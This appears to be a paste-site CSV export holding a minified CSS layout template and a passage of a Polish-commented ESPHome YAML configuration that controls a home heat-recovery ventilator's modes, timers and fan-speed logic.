id,title,username,language,date,content
LpNf9SuH,Halazia CSS,Hakrabis,CSS,Wednesday 23rd of July 2025 12:26:06 PM CDT,"@font-face{font-family:""Galvitra"";src:url(https://dl.dropbox.com/s/fhiet4342pwyo0xhe2vm1/Galvitra.ttf?rlkey=mtiow4d7prjtla2axf5urqks4&dl=0)}.BC-bg{width:650px;margin:auto;padding:20px 0;position:relative;display:flex;flex-direction:column;align-items:center;background:var(--BC-bg)}.BC-bg #BC-Cnt{width:540px;border:1.5px solid var(--BC-border);padding:10px}.BC-bg #BC-Cnt .BC-img{width:540px;height:240px}.BC-bg .BC-img span.BC-tit{width:auto;height:100px;padding:5px;position:relative;left:-130px;top:100px;z-index:1;display:grid;place-items:center;font:70px Galvitra;color:var(--BC-clr-title);text-shadow:2px 2px 4px #00000080}.BC-bg .BC-img span.BC-subtit{width:450px;padding:5px;position:relative;left:15px;top:60px;z-index:1;font:15px Oswald;text-transform:uppercase;letter-spacing:4px;color:var(--BC-clr-subtitle);text-shadow:2px 2px 4px #00000080}.BC-bsq1{width:450px;background:var(--BC-bg-bsq);margin:15px 0;padding:15px;position:relative;left:-55px;display:flex;justify-content:space-around}.BC-nmb{width:100px;color:var(--BC-clr-first-number);font:100px 'Bebas Neue';display:flex;justify-content:center;align-items:center}.BC-nmb span.BC-ok{color:var(--BC-clr-number-ok)}.BC-nmb span.BC-take{color:var(--BC-clr-number-take)}.BC-txt{width:300px;height:100px;color:var(--BC-clr-text);font:13px Nunito;text-align:justify;padding:10px;overflow:auto}.BC-bsq2{width:450px;background:var(--BC-bg-bsq);margin:15px 0;padding:20px;position:relative;right:-105px;display:flex;justify-content:space-around}.BC-lines{height:30px;display:flex;justify-content:center;align-items:center}.BC-line{width:100px;height:1px;background-color:var(--BC-border);margin:10px}.BC-icon{color:var(--BC-clr-icon);font-size:20px}.BC-fot{display:flex;justify-content:space-evenly;align-items:center}.BC-img2{width:125px;height:125px;border-radius:100%;border:1.7px solid var(--BC-border);padding:8px}.BC-img2 img{width:125px;height:125px;border-radius:100%}.BC-fot span.BC-quote{width:250px;color:var(--BC-clr-text);padding:10px;font:12px Nunito;text-align:justify}.BC-fot span.BC-quote span{color:var(--BC-clr-quote)}div::-webkit-scrollbar,span::-webkit-scrollbar{width:0}a.credi{color:#4d4d4d;font-family:Arial;text-decoration:none;font-size:9px;letter-spacing:2px;width:auto;position:relative;overflow:hidden;text-transform:uppercase;transition:color .3s cubic-bezier(0.11,0.7,0,1)}a.credi:hover{color:#ed6f88;transition:.2s}.citos:after{position:absolute;display:block;width:0;height:2px;background-color:#df1233;content:""""}"
1rW2bRxT,Holtop ERV esphome logger,blackscreener,YAML,Wednesday 23rd of July 2025 12:23:58 PM CDT,"esphome:
  name: $devicename
  #on_boot: 
  #  then:
    #  - pzemac.reset_energy: pzemac_1

esp32:
  board: nodemcu-32s
  #board_flash_mode: dout
  framework:
    type: esp-idf
    
    version: recommended
debug:
  update_interval: 60s


substitutions:
  devicename: reku-logger
  friendly_name: Rekuperator

wifi:
  ssid: !secret wifi_ssid
  password: !secret wifi_pass

  # Enable fallback hotspot (captive portal) in case wifi connection fails
  ap:
    ssid: ""sweet-fallback-${devicename}""
    password: cvbcbcbcvbdfbgte4

captive_portal:

logger:
  baud_rate: 0
  level: DEBUG

# Enable Home Assistant API
api:
  #password: !secret api-password

ota:
  - platform: esphome

# Enable Web server
#web_server:
# port: 80
i2c:
  - id: bus_a
    sda: 21
    scl: 22
    scan: false
   # frequency: 50kHz
  - id: bus_b
    sda: 18
    scl: 19
    scan: false
  #  frequency: 50kHz


uart:
  - id: mod_bus #reku
    tx_pin: 16
    rx_pin: 17
    baud_rate: 9600
    stop_bits: 1

  - id: mod_bus2 #pzem
    tx_pin: 1
    rx_pin: 3
    baud_rate: 9600
    stop_bits: 2  #1 dla esp8266


time:
  - platform: sntp
    id: czas_systemowy

# Example configuration entry
button:
  - platform: restart
    name: ""ESP Reku Restart""

globals:
  - id: przewietrzanie_timer_koniec_timestamp # <--- DODAJ TĘ LINIĘ
    type: int
    restore_value: yes
    initial_value: '0'

  - id: okap_timer_koniec_timestamp
    type: int
    restore_value: yes # Zachowaj stan po restarcie
    initial_value: '0' # 0 oznacza, ze timer nie jest aktywny

  - id: impreza_timer_koniec_timestamp
    type: int
    restore_value: yes
    initial_value: '0' # 0 oznacza, ze timer nie jest aktywny


  - id: licznik_korekt
    type: int
    restore_value: no
    initial_value: '0'

  - id: ostatni_timestamp_korekty # Nowa zmienna globalna
    type: int
    restore_value: yes # Ważne: przywróć wartość po restarcie, aby opóźnienie działało poprawnie
    initial_value: '0' # Domyślnie 0, co oznacza, że pierwsza korekta może nastąpić od razu po uruchomieniu

  - id: limit_korekt_na_godzine
    type: int
    restore_value: no
    initial_value: '10'

  - id: stary_nawiew
    type: int
    restore_value: no
    initial_value: '0'
  - id: stary_wywiew
    type: int
    restore_value: no
    initial_value: '0'

  # Aktualny tryb z podtypem dla trybu auto
  - id: tryb_auto_status
    type: std::string
    initial_value: '""normal""'

  # Aktualny aktywny tryb
  - id: aktywny_tryb
    type: std::string
    initial_value: '""auto""'

  - id: ostatnie_obroty
    type: int
    restore_value: no
    initial_value: '0'

  - id: czy_przewietrzanie
    type: bool
    restore_value: no
    initial_value: 'false'

modbus:
  - id: mod_bus_reventon
    uart_id: mod_bus
    send_wait_time: 200ms
 #   flow_control_pin: GPIO4
  - id: mod_bus_pzem
 #   send_wait_time: 200ms
    uart_id: mod_bus2

modbus_controller:
  - id: reventon_reku
    address: 0x01
    modbus_id: mod_bus_reventon
    update_interval: 15s

  - id: pzem1
    modbus_id: mod_bus_pzem
    address: 0x1
    #command_throttle: 0ms
    setup_priority: -10
    update_interval: 5s

text_sensor:
  - platform: debug
    device:
      name: ""Device Info""
    reset_reason:
      name: ""Reset Reason""


  - platform: template
    name: ""Aktywny tryb rekuperatora""
    lambda: |-
      std::string tryb = id(aktywny_tryb);
      if (tryb == ""auto"") {
        std::string status = id(tryb_auto_status);
        //return std::string(""Tryb auto - "") + status;
        return std::string(status);
      }
      return tryb;
    update_interval: 30s


  - platform: template
    name: ""Ostatni reset korekt""
    id: ostatni_reset_korekt
    lambda: |-
      char str[20];
      time_t curr_time = id(czas_systemowy).now().timestamp;
      strftime(str, sizeof(str), ""%H:%M"", localtime(&curr_time));
      return std::string(str);
    update_interval: 1h

  - platform: template
    name: $friendly_name Uptime
    id: uptime_human
    icon: mdi:clock-start



  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Status
    id: reku_status
    register_type: holding
    address: 0x0012 #18
    response_size: 2
    raw_encode: HEXBYTES
    #bitmask: 0
    lambda: |-
       std::string z = """";
       int idx = item->offset+1;
       if ((data[idx] & 0x0001) != 0) z += ""Alarm pożarowy ON, "";
       if ((data[idx] & 0x0002) != 0) z += ""Bypass ON, "";
       if ((data[idx] & 0x0004) != 0) z += ""Bypass OFF, "";
       if ((data[idx] & 0x0008) != 0) z += ""Odladzanie, "";
       if(z.length() > 0){
         z.pop_back();
       }
       return {z};

  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Status2
    id: reku_status2
    register_type: holding
    address: 0x0012 #18
    response_size: 2
    raw_encode: HEXBYTES

  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Fault Message
    id: reku_fault_message
    register_type: holding
    address: 0x0014 #20
    response_size: 2
    raw_encode: HEXBYTES

  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Fault Message2
    id: reku_fault_message2
    register_type: holding
    address: 0x0014 #20
    response_size: 2
    #raw_encode: HEXBYTES
    lambda: |-
       std::string z = """";
       int idx = item->offset+1;
       if ((data[idx] & 0x0001) != 0) z += ""Błąd czujnika temperatury powietrza zewnętrznego (OA), "";
       if ((data[idx] & 0x0002) != 0) z += ""Błąd pamięci EEPROM, "";
       if ((data[idx] & 0x0004) != 0) z += ""Błąd czujnika temperatury powietrza wywiewanego (RA) lub SW4-3 jest w pozycji ON, ale bez podłączenia do czujnika wilgotności, "";
       if ((data[idx] & 0x0008) != 0) z += ""Błąd czujnika temperatury powietrza usuwanego (EA), "";
       if ((data[idx] & 0x0010) != 0) z += ""Błąd komunikacji, "";
       if ((data[idx] & 0x0020) != 0) z += ""Błąd czujnika temperatury powietrza nawiewanego (SA), "";
       if ((data[idx] & 0x0040) != 0) z += ""Błąd wentylatora wywiewnego, "";
       if ((data[idx] & 0x0080) != 0) z += ""Błąd wentylatora nawiewnego, "";
   
       if(z.length() > 0){
         z.pop_back();
       }
       return {z};

script:
  - id: sprawdz_ograniczenie_korekt
    mode: single
    parameters:
      korekta_id: int
    then:
      - if:
          condition:
            lambda: return id(licznik_korekt) < id(limit_korekt_na_godzine);
          then:
            - lambda: 'id(licznik_korekt) += 1;'
            - logger.log:
                format: ""Wykonano korektę. Licznik: %d / %d""
                args:
                  - id(licznik_korekt)
                  - id(limit_korekt_na_godzine)
            - if:
                condition:
                  lambda: return korekta_id == 1;
                then:
                  - script.execute: korekta_do_nadcisnienia
            - if:
                condition:
                  lambda: return korekta_id == 2;
                then:
                  - script.execute: korekta_do_podcisnienia
 
            # --- DODAJ AKTUALIZACJĘ TIMESTAMPU PO WYKONANIU KOREKTY ---
            - lambda: 'id(ostatni_timestamp_korekty) = id(czas_systemowy).now().timestamp;'
            - logger.log: ""Zaktualizowano timestamp ostatniej korekty.""
          
          else:
            - logger.log: ""Limit korekt na godzinę osiągnięty – korekta zablokowana.""

  - id: korekta_do_nadcisnienia # Zwiększa wywiew, aby zredukować nadciśnienie (nawiew > wywiew)
    mode: restart
    then:
      - lambda: |-
          const int max_fan_difference = 3; 
          int current_nawiew = id(wentylator_nawiewny).state; // Nawiew jest referencją (stała wartość)
          int current_wywiew = id(wentylator_wywiewny).state;
          int new_wywiew = current_wywiew + 1; // Próbujemy zwiększyć wywiew

          // Warunki:
          // 1. New_wywiew nie może przekroczyć 10.
          // 2. Różnica (nawiew - new_wywiew) musi być <= max_fan_difference.
          //    (Czyli wywiew może być max o 3 biegi mniejszy od nawiewu)
          if (new_wywiew <= 10 && (current_nawiew - new_wywiew) <= max_fan_difference) {
            id(wentylator_wywiewny).make_call().set_value(new_wywiew).perform();
            ESP_LOGI(""Korekta_Nadcisnienia"", ""Zwiekszono wywiew: wywiew = %d (nawiew = %d). Roznica: %d"",
                     new_wywiew, current_nawiew, current_nawiew - new_wywiew);
          } else {
            ESP_LOGI(""Korekta_Nadcisnienia"", ""Korekta nadcisnienia zablokowana: wywiew=%d, nawiew=%d. Roznica %d, limit %d. (Wywiew min/max lub poza roznica)"",
                     current_wywiew, current_nawiew, current_nawiew - current_wywiew, max_fan_difference);
          }


  - id: korekta_do_podcisnienia # Zmniejsza wywiew, aby zredukować podciśnienie (nawiew < wywiew)
    mode: restart
    then:
      - lambda: |-
          const int max_fan_difference = 3; 
          int current_nawiew = id(wentylator_nawiewny).state; // Nawiew jest referencją (stała wartość)
          int current_wywiew = id(wentylator_wywiewny).state;
          int new_wywiew = current_wywiew - 1; // Próbujemy zmniejszyć wywiew

          // Warunki:
          // 1. New_wywiew nie może schodzić poniżej 0.
          // 2. Różnica (new_wywiew - nawiew) musi być <= max_fan_difference.
          //    (Czyli wywiew może być max o 3 biegi większy od nawiewu)
          if (new_wywiew >= 0 && (new_wywiew - current_nawiew) <= max_fan_difference) {
            id(wentylator_wywiewny).make_call().set_value(new_wywiew).perform();
            ESP_LOGI(""Korekta_Podcisnienia"", ""Zmniejszono wywiew: wywiew = %d (nawiew = %d). Roznica: %d"",
                     new_wywiew, current_nawiew, new_wywiew - current_nawiew);
          } else {
            ESP_LOGI(""Korekta_Podcisnienia"", ""Korekta podcisnienia zablokowana: wywiew=%d, nawiew=%d. Roznica %d, limit %d. (Wywiew min/max lub poza roznica)"",
                     current_wywiew, current_nawiew, current_wywiew - current_nawiew, max_fan_difference);
          }

  - id: wlacz_przewietrzanie
    mode: single
    then:
      - logger.log: ""TRYB PRZEWIETRZANIA: aktywacja""
      - switch.turn_off: balans_przeplywu_switch
      - lambda: |-
          id(czy_przewietrzanie) = true;
          id(stary_nawiew) = (int)id(wentylator_nawiewny).state;
          id(stary_wywiew) = (int)id(wentylator_wywiewny).state;
          id(przewietrzanie_timer_koniec_timestamp) = id(czas_systemowy).now().timestamp + (int)id(czas_przewietrzania_minuty).state * 60;
      - number.set:
          id: wentylator_nawiewny
          value: 10
      - number.set:
          id: wentylator_wywiewny
          value: 10
      - lambda: |-
          int czas = (int)id(czas_przewietrzania_minuty).state;
          ESP_LOGI(""przewietrzanie"", ""Czas przewietrzania: %d min"", czas);
      - delay: !lambda 'return id(czas_przewietrzania_minuty).state * 60 * 1000;'
      - switch.turn_off: tryb_przewietrzania_switch

  - id: zakoncz_przewietrzanie
    mode: single
    then:
      - logger.log: ""TRYB PRZEWIETRZANIA: zakończenie – przywracanie poprzednich ustawień""
      - lambda: |-
          id(czy_przewietrzanie) = false;
          id(przewietrzanie_timer_koniec_timestamp) = 0; // Wyzeruj timer
      - number.set:
          id: wentylator_nawiewny
          value: !lambda 'return id(stary_nawiew);'
      - number.set:
          id: wentylator_wywiewny
          value: !lambda 'return id(stary_wywiew);'
      - switch.turn_on: balans_przeplywu_switch
      - homeassistant.event:
          event: esphome.przewietrzanie_zakonczone
          data:
            message: ""Tryb przewietrzania zakończony""
            nawiew: !lambda 'return id(wentylator_nawiewny).state;'
            wywiew: !lambda 'return id(wentylator_wywiewny).state;'

#   - id: set_mode
#     mode: single
#     parameters:
#       tryb: std::string
#     then:
#       - lambda: |-
#           id(aktywny_tryb) = tryb;
#           id(tryb_select_esp).publish_state(tryb);
#           ESP_LOGI(""tryb"", ""Ustawiono tryb: %s"", tryb.c_str());

#       - switch.turn_on: balans_przeplywu_switch

#       - if:
#           condition:
#             lambda: return tryb == ""nocny"";
#           then:
#             - switch.turn_off: balans_przeplywu_switch
#             - number.set:
#                 id: wentylator_nawiewny
#                 value: 2
#             - number.set:
#                 id: wentylator_wywiewny
#                 value: 2

#       - if:
#           condition:
#             lambda: return tryb == ""intensywny"";
#           then:
#             - number.set:
#                 id: wentylator_nawiewny
#                 value: 10
#             - number.set:
#                 id: wentylator_wywiewny
#                 value: 10
#             - delay: 2h
#             - script.execute:
#                 id: set_mode
#                 tryb: ""normalny""

#       - if:
#           condition:
#             lambda: return tryb == ""gosc"";
#           then:
#             - number.set:
#                 id: wentylator_nawiewny
#                 value: 10
#             - number.set:
#                 id: wentylator_wywiewny
#                 value: 10
#             - switch.turn_off: balans_przeplywu_switch
#             - delay: 4h
#             - homeassistant.event:
#                 event: esphome.tryb_goscia
#                 data:
#                   message: ""Tryb gość zakończony. Powrót do normalnego trybu.""
#             - script.execute:
#                 id: set_mode
#                 tryb: ""normalny""

#       - if:
#           condition:
#             lambda: return tryb == ""urlopowy"";
#           then:
#             - switch.turn_off: balans_przeplywu_switch
#             - number.set:
#                 id: wentylator_nawiewny
#                 value: 1
#             - number.set:
#                 id: wentylator_wywiewny
#                 value: 1

#       - if:
#           condition:
#             lambda: return tryb == ""serwisowy"";
#           then:
#             - switch.turn_off: balans_przeplywu_switch
#             - switch.turn_off: tryb_przewietrzania_switch

#       - if:
#           condition:
#             lambda: return tryb == ""auto"";
#           then:
#             - switch.turn_on: balans_przeplywu_switch

#       - if:
#           condition:
#             lambda: return tryb == ""normalny"";
#           then:
#             - switch.turn_on: balans_przeplywu_switch


#       - if:
#           condition:
#             lambda: return tryb == ""okno"";
#           then:
#             - switch.turn_off: balans_przeplywu_switch
#             - number.set:
#                 id: wentylator_nawiewny
#                 value: 1
#             - number.set:
#                 id: wentylator_wywiewny
#                 value: 3
#             - lambda: id(ostatnie_obroty) = 3;

  - id: set_mode
    mode: single
    parameters:
      mode: std::string 
      target_reku_speed: int
    then:
      - lambda: |-
          std::string new_mode = mode;
          int obroty_nawiew = 0;
          int obroty_wywiew = 0;

          if (new_mode == ""auto"") {
            obroty_nawiew = 3; 
            obroty_wywiew = 3;
            ESP_LOGI(""set_mode"", ""Tryb AUTO: Poczatkowe obroty: Nawiew=%d, Wywiew=%d. Dalsza regulacja w interval."", obroty_nawiew, obroty_wywiew);            
            id(reku_on_off_switch).make_call().set_value(true).perform(); // Upewnij sie, ze glowny przelacznik jest ON
            id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer imprezy
            // W trybie auto dalsze obroty sa dynamicznie ustalane przez interval: 1min
          
          } else if (new_mode == ""nocny"") {
            obroty_nawiew = 2; 
            obroty_wywiew = 2;
            ESP_LOGI(""set_mode"", ""Tryb NOCNY: Poczatkowe obroty: Nawiew=%d, Wywiew=%d. Dalsza regulacja w interval."", obroty_nawiew, obroty_wywiew);            
            id(reku_on_off_switch).make_call().set_value(true).perform(); 
            id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer imprezy           

          } else if (new_mode == ""okno"") {
            obroty_nawiew = 1; 
            obroty_wywiew = 4; 
            ESP_LOGI(""set_mode"", ""Tryb OKNO: Nawiew=%d, Wywiew=%d."", obroty_nawiew, obroty_wywiew);            
            id(reku_on_off_switch).make_call().set_value(true).perform(); 
            id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer imprezy


          } else if (new_mode == ""normalny"") {
            obroty_nawiew = 2; 
            obroty_wywiew = 2; 
            ESP_LOGI(""set_mode"", ""Tryb NORMALNY Nawiew=%d, Wywiew=%d."", obroty_nawiew, obroty_wywiew);            
            id(reku_on_off_switch).make_call().set_value(true).perform(); 
            id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer imprezy


          } else if (new_mode == ""serwisowy"") {
            id(reku_on_off_switch).make_call().set_value(false).perform(); 
            id(tryb_przewietrzania_switch).turn_off();
            id(balans_przeplywu_switch).turn_off();
            ESP_LOGI(""set_mode"", ""Tryb SERWISOWY: Wylaczam rekuperator. Wentylatory: Nawiew=%d, Wywiew=%d."", obroty_nawiew, obroty_wywiew);
            id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer imprezy

          } else if (new_mode == ""urlopowy"") {
            obroty_nawiew = 1;
            obroty_wywiew = 1;
            ESP_LOGI(""set_mode"", ""Tryb URLOPOWY: Wentylatory wylaczone (Nawiew=%d, Wywiew=%d)."", obroty_nawiew, obroty_wywiew);
            id(reku_on_off_switch).make_call().set_value(true).perform();         
            id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer imprezy

          } else if (new_mode == ""okap_auto"") {
            obroty_nawiew = target_reku_speed;
            obroty_wywiew = target_reku_speed;
            ESP_LOGI(""set_mode"", ""Tryb OKAP_AUTO: Nawiew=%d, Wywiew=%d (zalezne od predkosci okapu)."", obroty_nawiew, obroty_wywiew);            
            id(reku_on_off_switch).make_call().set_value(true).perform(); 
            id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer imprezy
          
          } else if (new_mode == ""wylaczony"") {
            ESP_LOGI(""set_mode"", ""Tryb WYLACZONY: Rekuperator wylaczony (Nawiew=%d, Wywiew=%d)."", obroty_nawiew, obroty_wywiew);
            id(reku_on_off_switch).make_call().set_value(false).perform(); 
            id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer imprezy
            id(tryb_przewietrzania_switch).turn_off();
            id(balans_przeplywu_switch).turn_off();

          } else if (new_mode == ""impreza"") { 
            obroty_nawiew = 7; 
            obroty_wywiew = 7;
            ESP_LOGI(""set_mode"", ""Tryb IMPREZA: Nawiew=%d, Wywiew=%d. Aktywny na %d godzin."", obroty_nawiew, obroty_wywiew, (int)id(impreza_czas_trwania_godz).state);
            id(reku_on_off_switch).make_call().set_value(true).perform();
            // Ustaw timer zakonczenia trybu Impreza (teraz + zdefiniowany czas w minutach)
            id(impreza_timer_koniec_timestamp) = id(czas_systemowy).now().timestamp + (int)id(impreza_czas_trwania_godz).state * 3600;

          }
          else {
            ESP_LOGW(""set_mode"", ""Nieznany tryb: %s"", new_mode.c_str());
            return;
          }

          // Wykonaj zmiany obrotow tylko jesli tryb sie zmienil LUB
          // jesli to tryb 'okap_auto' i jego obroty sie zmienily (bo sa dynamiczne)
          // UWAGA: Jesli reku_on_off_switch zostal wylaczony wczesniej, wentylatory i tak zostana ustawione na 0.
          if (id(aktywny_tryb) != new_mode ||
              (new_mode == ""okap_auto"" && (id(wentylator_nawiewny).state != obroty_nawiew || id(wentylator_wywiewny).state != obroty_wywiew))) {

            id(aktywny_tryb) = new_mode;
            id(ostatnie_obroty) = obroty_nawiew; // Aktualizuj dla spójności

            // Aktualizacja select.tryb_select_esp ---
            id(tryb_select_esp).publish_state(new_mode); 

            // Logika ustawiania obrotow wentylatorow (wykonuje sie nawet jesli sa na 0)
            ESP_LOGI(""set_mode"", ""Przelaczono na tryb: '%s'. Ustawiam obroty: Nawiew=%d, Wywiew=%d."", new_mode.c_str(), obroty_nawiew, obroty_wywiew);
            id(wentylator_nawiewny).make_call().set_value(obroty_nawiew).perform();
            id(wentylator_wywiewny).make_call().set_value(obroty_wywiew).perform();
          } else {
            ESP_LOGD(""set_mode"", ""Tryb '%s' juz jest aktywny z obrotami Nawiew=%d. Brak zmian."", new_mode.c_str(), obroty_nawiew);
          }

interval:
  - interval: 1h
    then:
      - lambda: 'id(licznik_korekt) = 0;'
      - component.update: licznik_korekt_sensor
      - component.update: licznik_korekt_pozostale
      - component.update: ostatni_reset_korekt

  - interval: 1min
    then:
      - lambda: |-
          // Sprawdz glowny przelacznik rekuperatora. Jesli jest wylaczony, przerwij logike sterowania.
          // Tryby ""serwisowy"", ""urlopowy"", ""wylaczony"" obsluguja to poprzez wylaczenie reku_on_off_switch.
          if (!id(reku_on_off_switch).state) {
            ESP_LOGD(""interval"", ""Rekuperator wylaczony glownym przelacznikiem. Pomijam logike sterowania."");
            id(tryb_auto_status) = ""reku wylaczony (switch OFF)""; // Uaktualnij status
            return; // Przerwij dalsze wykonywanie lambdy
          }

          // --- LOGIKA DLA TRYBU OKAPU (z wykorzystaniem sensora predkosci z Home Assistant) ---
          float hood_fan_speed_percent = 0.0;
          if (id(okap_predkosc_ha).has_state()) { // Sprawdz, czy sensor ma juz stan
              hood_fan_speed_percent = id(okap_predkosc_ha).state;
          } else {
              // W przypadku braku stanu sensora, traktujemy okap jako wylaczony
              ESP_LOGW(""okap_logic"", ""Sensor okap_predkosc_ha nie ma stanu! Traktuje okap jako wylaczony."");
          }

          bool okap_is_on = hood_fan_speed_percent > 0.0; // Okap jest wlaczony, jesli predkosc > 0

          int reku_speed_for_okap = 0;
          std::string okap_status_text = """";

          if (okap_is_on) {
            // Dostosuj progi i obroty rekuperatora do swoich biezacych potrzeb
            // Przyjmujemy 3 biegi okapu: niski, sredni, wysoki
            if (hood_fan_speed_percent > 66.0) { // Np. powyzej 66% to Bieg 3 okapu
              reku_speed_for_okap = 9; // Najwyzsze obroty rekuperatora
              okap_status_text = ""Okap: Bieg 3 (Wysoki)"";
            } else if (hood_fan_speed_percent > 33.0) { // Np. powyzej 33% to Bieg 2 okapu
              reku_speed_for_okap = 7; // Srednie obroty rekuperatora
              okap_status_text = ""Okap: Bieg 2 (Sredni)"";
            } else { // Pomiedzy 0% a 33% to Bieg 1 okapu
              reku_speed_for_okap = 5; // Nizsze obroty rekuperatora
              okap_status_text = ""Okap: Bieg 1 (Niski)"";
            }

            // Aktywuj tryb okap_auto i ustaw odpowiednie obroty
            if (id(aktywny_tryb) != ""okap_auto"" ||
                id(wentylator_nawiewny).state != reku_speed_for_okap) {
              ESP_LOGI(""tryb"", ""Wykryto aktywny Okap (%s) - przelaczam w tryb OKAP_AUTO. Obroty reku: %d."", okap_status_text.c_str(), reku_speed_for_okap);
              id(set_mode)->execute(""okap_auto"", reku_speed_for_okap);
            }
            id(tryb_auto_status) = okap_status_text;

            // Ustaw ""timer"" okapu: oblicz czas zakonczenia na teraz + czas trwania z number.okap_czas_trwania_min
            id(okap_timer_koniec_timestamp) = id(czas_systemowy).now().timestamp + (int)id(okap_czas_trwania_min).state * 60;
            ESP_LOGI(""tryb"", ""Timer OKAP_AUTO zresetowany na %d minut. Koniec o: %s"", (int)id(okap_czas_trwania_min).state, id(czas_systemowy).now().strftime(""%Y-%m-%d %H:%M:%S"").c_str());

            return; // Zakoncz, bo tryb okap ma priorytet
          } else { // Okap jest wylaczony (hood_fan_speed_percent jest 0)
            if (id(aktywny_tryb) == ""okap_auto"") {
                // Jesli bylismy w trybie okap_auto, ale okap sie wylaczyl, sprawdzamy ""timer""
                if (id(czas_systemowy).now().timestamp >= id(okap_timer_koniec_timestamp)) {
                    ESP_LOGI(""tryb"", ""Okap wylaczony, timer OKAP_AUTO minal - powracam do trybu AUTO."");
                    id(set_mode)->execute(""auto"", 0);
                    id(okap_timer_koniec_timestamp) = 0; // Wyzeruj timer po zakonczeniu
                } else {
                    int remaining_seconds = id(okap_timer_koniec_timestamp) - id(czas_systemowy).now().timestamp;
                    id(tryb_auto_status) = ""Okap wylaczony (timer aktywny)"";
                    ESP_LOGD(""tryb"", ""Okap wylaczony, timer OKAP_AUTO nadal aktywny. Pozostalo: %d s"", remaining_seconds);
                }
                return;
            }
          }
          // --- KONIEC LOGIKI TRYBU OKAPU ---


          // --- LOGIKA TRYBU IMPREZA (NAJWYŻSZY PRIORYTET PO OKAPIE) ---
          if (id(aktywny_tryb) == ""impreza"") {
            if (id(czas_systemowy).now().timestamp >= id(impreza_timer_koniec_timestamp)) {
                ESP_LOGI(""tryb"", ""Timer trybu IMPREZA minal - powracam do trybu AUTO."");
                id(set_mode)->execute(""auto"", 0);
                id(impreza_timer_koniec_timestamp) = 0; // Wyzeruj timer po zakonczeniu
                return; // Zakoncz, bo tryb zmieniony
            } else {
                int remaining_minutes = (id(impreza_timer_koniec_timestamp) - id(czas_systemowy).now().timestamp) / 60;
                id(tryb_auto_status) = ""Impreza ("" + std::to_string(remaining_minutes) + "" min do konca)"";
                ESP_LOGD(""tryb"", ""Tryb IMPREZA nadal aktywny. Pozostalo: %d min"", remaining_minutes);
                return; // Zakoncz, bo tryb impreza ma priorytet nad auto/nocny
            }
          }
          // --- KONIEC LOGIKI TRYBU IMPREZA ---

          // Pobierz aktualny czas
          auto t = id(czas_systemowy).now();
          int hour = t.hour;

          // --- NOWA LOGIKA: Wyjście z trybu nocnego ---
          // Jeśli jesteśmy w trybie nocnym, a godzina nie jest już nocna (np. >= 6 rano i < 23)
          if (id(aktywny_tryb) == ""nocny"" && (hour >= 6 && hour < 23)) {
              ESP_LOGI(""tryb"", ""Koniec trybu nocnego - przechodzę w tryb AUTO."");
              id(set_mode)->execute(""auto"", 0);
              return; // Zakończ, by w tej minucie już być w trybie auto
          }
          // --- KONIEC NOWEJ LOGIKI ---


          // 1. Logika otwartego okna 
          if (id(czy_jakies_okno_otwarte).state) {
            // Jeśli okno jest otwarte i system jest włączony, ale nie jest w trybie ""okno""
            if (id(reku_on_off_switch).state && id(aktywny_tryb) != ""okno"") {
              ESP_LOGI(""tryb"", ""Okno otwarte — przełączam w tryb OKNO"");
              id(set_mode)->execute(""okno"", 0);
            }
            // Zawsze kończ działanie, jeśli jakiekolwiek okno jest otwarte
            return;
          }

          // Jeśli doszliśmy tutaj, to znaczy, że wszystkie okna są ZAMKNIĘTE.
          // Sprawdź, czy trzeba wyjść z trybu ""okno""
          if (id(aktywny_tryb) == ""okno"") {
            ESP_LOGI(""tryb"", ""Wszystkie okna zamknięte — przywracam tryb AUTO"");
            id(set_mode)->execute(""auto"", 0);
            return; // Zakończ, aby w następnej minucie już działać w trybie auto
          }



          // Sprawdź warunki do wejścia w tryb nocny
          if ((hour >= 23 || hour < 6) &&
              id(reku_on_off_switch).state == 1 &&
              !id(czy_przewietrzanie) &&
              id(aktywny_tryb) != ""serwisowy"" &&
              id(aktywny_tryb) != ""urlopowy"" &&
              id(aktywny_tryb) != ""nocny"" &&
              id(aktywny_tryb) != ""okno"" &&
              !id(dom_pusty).state) { // <--- TUTAJ USUNIĘTO DODATKOWY NAWIAS ZAMYKAJĄCY
            ESP_LOGI(""tryb"", ""Automatyczne przełączenie na tryb nocny"");
            id(set_mode)->execute(""nocny"", 0);
            return;  // pomiń dalej logikę w tej minucie
          }

          if (id(reku_on_off_switch).state != 1) {
            id(tryb_auto_status) = ""reku wyłączony"";
            return;
          }
          if (id(czy_przewietrzanie)) {
            id(tryb_auto_status) = ""przewietrzanie aktywne"";
            return;
          }

          std::string tryb = id(aktywny_tryb);

          // Deklaracje zmiennych na tym poziomie
          float hum = 0.0;
          int co2 = 0;
          bool pusty = id(dom_pusty).state; // Pobranie stanu 'dom_pusty' raz

          // Pobranie wartości z globalnych sensorów
          if (id(max_humidity_all_sensors).has_state()) {
              hum = id(max_humidity_all_sensors).state;
          } else {
              // Wartość domyślna, jeśli sensor max_humidity_all_sensors nie ma jeszcze stanu
              // To jest tylko na wypadek braku odczytu na samym starcie
              hum = 0.0;
              ESP_LOGW(""Wilgotnosc"", ""Maksymalna wilgotność nie jest dostępna!"");
          }

          if (id(co2_value).has_state()) {
              co2 = (int)id(co2_value).state;
          }

          if (tryb == ""nocny"") {
            // Logika CO2 i wilgotności dla trybu nocnego
            int obroty = id(ostatnie_obroty);
            std::string status;

            if (co2 > id(co2_nocny_high).state) {
              obroty = 5;
              status = ""nocny - wysoki CO2"";
            } else if (co2 < id(co2_nocny_low).state) {
              obroty = 2;
              status = ""nocny - niski CO2"";
            }

            // Dodatkowa logika wilgotności nocnej
            if (hum > id(wilgotnosc_nocna_high).state && obroty < 4) {
              obroty = 4;
              status = ""nocny - wysoka wilgotność"";
            } else if (hum < id(wilgotnosc_nocna_low).state && obroty > 2) {
              obroty = 2;
              status = ""nocny - niska wilgotność"";
            }

            // Wykonaj tylko jeśli się zmieniło
